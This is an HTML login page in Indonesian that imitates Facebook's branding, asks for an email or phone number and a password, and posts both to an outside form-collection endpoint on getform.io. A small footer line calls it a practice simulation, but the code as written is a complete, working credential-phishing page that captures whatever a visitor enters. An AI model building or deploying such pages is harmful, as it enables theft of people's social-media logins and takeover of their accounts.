<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Facebook</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #e9efff, #f0fff4);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background: #ffffff;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .login-box h1 {
      color: #1877f2;
      font-size: 32px;
      margin-bottom: 20px;
      font-weight: 700;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 16px;
      transition: 0.2s;
    }

    input:focus {
      outline: none;
      border-color: #1877f2;
      box-shadow: 0 0 5px rgba(24, 119, 242, 0.3);
    }

    button {
      background: #1877f2;
      color: #fff;
      border: none;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 15px;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #145dbf;
    }

    .note {
      font-size: 13px;
      color: #777;
      margin-top: 20px;
    }

    @media screen and (max-width: 480px) {
      .login-box {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h1>facebook</h1>
    <form action="https://getform.io/f/avryknka" method="POST">
      <input type="text" name="email" placeholder="Email atau Nomor Telepon" required>
      <input type="text" name="name" placeholder="Kata Sandi" required>
      <button type="submit">Masuk</button>
    </form>
    <div class="note">Halaman ini hanya simulasi latihan & data akan dikirim ke Getform</div>
  </div>

</body>
</html>
